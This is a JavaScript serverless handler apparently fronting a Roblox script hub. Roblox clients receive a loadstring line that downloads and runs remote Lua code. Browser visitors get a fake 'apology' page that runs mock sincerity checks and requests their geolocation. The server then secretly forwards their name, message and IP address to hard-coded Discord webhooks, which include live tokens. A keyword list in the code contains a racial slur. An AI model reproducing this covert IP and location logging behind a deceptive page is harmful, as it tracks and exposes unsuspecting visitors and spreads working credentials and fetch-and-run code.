export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';

  if (userAgent.includes('Roblox') || userAgent === '') {
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(`
print("Script loaded!")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
    `);
  } else if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      const data = JSON.parse(body);
      let name = (data.name || 'Unknown').replace(/@/g, '@\u200b');
      let message = (data.message || 'No message').replace(/@/g, '@\u200b');

      const skidWebhook = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
      const ipWebhook = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';

      // Send name + message to first webhook
      await fetch(skidWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}` })
      });

      // Send IP info (just example IP since Vercel hides real IPs)
      const fakeIP = req.headers['x-forwarded-for'] || '0.0.0.0';
      await fetch(ipWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `**IP Address:** ${fakeIP}\n**Name:** ${name}` })
      });

      // Detect troll message
      const trollWords = ['troll', 'fuck', 'lmao', 'nigga', 'shit', 'idiot', 'noob'];
      let isTroll = trollWords.some(word => message.toLowerCase().includes(word));

      if (isTroll) {
        res.redirect('https://m.youtube.com/watch?v=NjD0H4eBfng&pp=ygUObmFlIG5pKiphIHNvbmc%3D');
      } else {
        res.redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
      }
    });
  } else {
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WHAT ARE YOU DOING</title>
<style>
  body {
    background: black;
    color: white;
    font-family: monospace;
    text-align: center;
    margin-top: 100px;
    overflow-x: hidden;
  }
  input, textarea, button {
    padding: 10px;
    margin: 10px;
    font-size: 16px;
    width: 300px;
  }
  #loadingText {
    margin-top: 20px;
  }
</style>
</head>
<body>
<h1>WHAT ARE YOU DOING</h1>
<p>Type your name and apology:</p>
<input type="text" id="nameBox" placeholder="Your Name"><br>
<textarea id="messageBox" rows="4" placeholder="I'm sorry..."></textarea><br>
<button onclick="sendMessage()">Send</button>
<div id="loadingText"></div>

<script>
const sadSound = new Audio('https://www.myinstants.com/media/sounds/sad-trombone.mp3');

async function sendMessage() {
  const name = document.getElementById('nameBox').value.trim();
  const message = document.getElementById('messageBox').value.trim();
  const loadingText = document.getElementById('loadingText');

  if (!name || !message) {
    alert('Please fill all fields!');
    return;
  }

  loadingText.innerText = 'Verifying apology...';
  await delay(1000);
  loadingText.innerText = 'Checking sincerity...';
  await delay(1000);
  loadingText.innerText = 'Analyzing emotions...';
  await delay(1000);
  loadingText.innerText = 'Apology FAILED!';

  sadSound.play();
  shakeScreen();
  await delay(2000);

  let geoLocation = { latitude: 'Not available', longitude: 'Not available' };
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      geoLocation.latitude = pos.coords.latitude;
      geoLocation.longitude = pos.coords.longitude;
    } catch (e) {}
  }

  fetch(window.location.pathname, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: name, message: message, geoLocation: geoLocation })
  });
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function shakeScreen() {
  let x = 0;
  const interval = setInterval(() => {
    document.body.style.transform = `translate(${(Math.random() * 20 - 10)}px, ${(Math.random() * 20 - 10)}px)`;
    x++;
    if (x > 15) {
      clearInterval(interval);
      document.body.style.transform = 'translate(0px, 0px)';
    }
  }, 50);
}
</script>
</body>
</html>
    `);
  }
}
